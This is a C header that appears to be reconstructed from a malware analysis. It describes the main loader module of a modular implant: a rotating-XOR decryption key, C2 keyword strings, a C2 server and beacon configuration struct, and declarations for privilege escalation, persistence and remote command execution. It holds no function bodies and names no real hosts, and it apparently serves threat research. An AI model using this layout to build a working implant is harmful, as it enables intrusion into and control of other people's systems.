/**
 * PE #1 - Main Loader Header
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * PE #1 is the main loader module (~100KB) that:
 * 1. Establishes C2 communication
 * 2. Coordinates all other PE modules
 * 3. Implements persistence mechanisms
 * 4. Handles post-exploitation tasks
 * 
 * Key properties:
 * - Size: ~100KB
 * - Encryption: Rotating XOR (base key 0xDF)
 * - C2 Keywords: I0C2, M{C2, BoT``, 7C2,
 */

#ifndef PE1_LOADER_H
#define PE1_LOADER_H

#include <windows.h>

//=============================================================================
// CONFIGURATION
//=============================================================================

// Encryption parameters
#define PE1_BASE_XOR_KEY        0xDF
#define PE1_KEY_ROTATION        TRUE

// C2 keywords found in binary
#define C2_KEYWORD_1            "I0C2"
#define C2_KEYWORD_2            "M{C2"
#define C2_KEYWORD_3            "BoT``"
#define C2_KEYWORD_4            "7C2,"
#define C2_KEYWORD_5            "(C2R@"
#define C2_KEYWORD_6            "T^ c2"
#define C2_KEYWORD_7            "C2!R"

// Module identifiers
typedef enum _MODULE_ID {
    MODULE_PE1_LOADER = 1,
    MODULE_PE2_DNS = 2,
    MODULE_PE3_CONTAINER = 3,
    MODULE_PE4_STUB = 4,
    MODULE_PE5_EXPLOIT = 5
} MODULE_ID;

// Loader states
typedef enum _LOADER_STATE {
    STATE_INITIALIZING = 0,
    STATE_DECRYPTING,
    STATE_EXTRACTING_MODULES,
    STATE_PRIVILEGE_ESCALATION,
    STATE_ESTABLISHING_C2,
    STATE_PERSISTENCE,
    STATE_ACTIVE,
    STATE_ERROR
} LOADER_STATE;

//=============================================================================
// C2 CONFIGURATION
//=============================================================================

typedef struct _C2_CONFIG {
    WCHAR   PrimaryServer[256];
    WCHAR   BackupServer[256];
    USHORT  Port;
    DWORD   BeaconInterval;         // Seconds between check-ins
    DWORD   JitterPercent;          // Random variance in timing
    BOOL    UseDNS;                 // Use DNS tunneling (PE #2)
    BOOL    UseHTTPS;               // Use HTTPS C2
} C2_CONFIG, *PC2_CONFIG;

//=============================================================================
// FUNCTION DECLARATIONS
//=============================================================================

/**
 * Main loader entry point.
 */
DWORD WINAPI 
PE1_LoaderMain(
    LPVOID lpParameter
);

/**
 * Decrypt PE #1 payload (rotating XOR).
 */
BOOL 
PE1_Decrypt(
    PBYTE   Buffer,
    DWORD   Size
);

/**
 * Extract and deploy all PE modules.
 */
BOOL 
PE1_DeployModules(VOID);

/**
 * Launch privilege escalation (PE #5).
 */
BOOL 
PE1_EscalatePrivileges(VOID);

/**
 * Establish C2 communication.
 */
BOOL 
PE1_EstablishC2(
    PC2_CONFIG Config
);

/**
 * Install persistence mechanism.
 */
BOOL 
PE1_InstallPersistence(VOID);

/**
 * Main C2 command loop.
 */
VOID 
PE1_CommandLoop(VOID);

/**
 * Execute received command.
 */
BOOL 
PE1_ExecuteCommand(
    PBYTE   Command,
    DWORD   CommandSize,
    PBYTE*  Response,
    PDWORD  ResponseSize
);

/**
 * Get current loader state.
 */
LOADER_STATE 
PE1_GetState(VOID);

#endif // PE1_LOADER_H
